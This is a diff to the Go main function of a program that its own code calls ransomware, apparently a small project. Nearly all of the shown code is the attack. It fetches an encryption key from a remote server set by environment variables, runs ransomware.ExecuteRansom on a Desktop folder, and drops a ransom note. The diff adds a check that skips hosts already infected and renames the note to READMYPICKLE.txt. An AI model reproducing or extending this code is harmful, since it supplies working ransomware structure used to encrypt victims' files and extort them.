@@ -41,13 +41,22 @@ func main() {
 		return
 	}
 
-	err := godotenv.Load()
+	// check if ransomware was already executed
+	_, err := os.Stat(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//READMYPICKLE.txt"))
+	if err == nil {
+		fmt.Println("Ransomware has already been executed. Exiting...")
+		return
+	}
+
+	err = godotenv.Load()
 	if err != nil {
 		log.Fatal("Error loading .env file")
 	}
 
 	ipaddr := os.Getenv("IP_ADDRESS")
 	port := os.Getenv("PORT")
+
+	fmt.Println("Connecting to server...")
 
 	resp, err := http.Get("http://" + ipaddr + ":" + port + "/createkey")
 	if err != nil {
@@ -56,14 +65,18 @@ func main() {
 	}
 	defer resp.Body.Close()
 
+	fmt.Println("Getting key from server...")
+
 	key, err := io.ReadAll(resp.Body)
 	if err != nil {
 		fmt.Println("Error reading key:", err)
 		return
 	}
 
+	fmt.Println("Key:", string(key))
+
 	ransomware.ExecuteRansom(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//songs"), key)
 	key = nil
 
-	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//README.txt"), []byte(Statement), 0644)
+	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//READMYPICKLE.txt"), []byte(Statement), 0644)
 }
